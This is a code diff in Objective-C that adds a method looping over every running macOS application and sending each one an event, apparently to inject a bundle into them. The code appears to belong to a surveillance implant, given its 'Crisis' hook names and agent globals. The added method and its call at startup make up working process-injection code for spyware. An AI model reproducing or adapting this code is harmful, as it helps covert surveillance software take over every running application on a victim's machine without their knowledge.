@@ -3443,6 +3443,9 @@ void lionSendEventToPid(pid_t pidP)
     }
 #endif
   
+  // inject all running apps in the ws
+  [self injectRunningApp];
+  
   // Register notification for new process
   [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver: self 
                                                          selector: @selector(injectBundle:)
@@ -3620,6 +3623,33 @@ void lionSendEventToPid(pid_t pidP)
   [pool release];  
 }
 
+- (void)injectRunningApp
+{
+  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
+  
+  NSWorkspace *ws = [NSWorkspace sharedWorkspace];
+  
+  NSArray *apps = [ws runningApplications];
+  
+  if (apps && [apps count]) 
+    {
+      for (int i=0; i<[apps count]; i++) 
+        {
+          NSRunningApplication *app = (NSRunningApplication*) [apps objectAtIndex:i];
+          NSNumber *thePid = [[NSNumber alloc] initWithInt: [app processIdentifier]];
+//#ifdef DEBUG_CORE
+        NSLog(@"%s: Injecting app %@ [%d]", __FUNCTION__, 
+              [app localizedName], [app processIdentifier]);
+//#endif
+          [self sendEventToPid:thePid]; 
+          [thePid release];
+          usleep(500);
+        }
+    }
+    
+  [pool release];
+}
+
 - (BOOL)isCrisisHookApp: (NSString*)appName
 {
   if (gAgentCrisisApp == nil)
@@ -3701,7 +3731,6 @@ void lionSendEventToPid(pid_t pidP)
     return;
   }
   
-
   if ([gUtil isLeopard] && (getuid() == 0 || geteuid() == 0))
     {
 #ifdef DEBUG_CORE
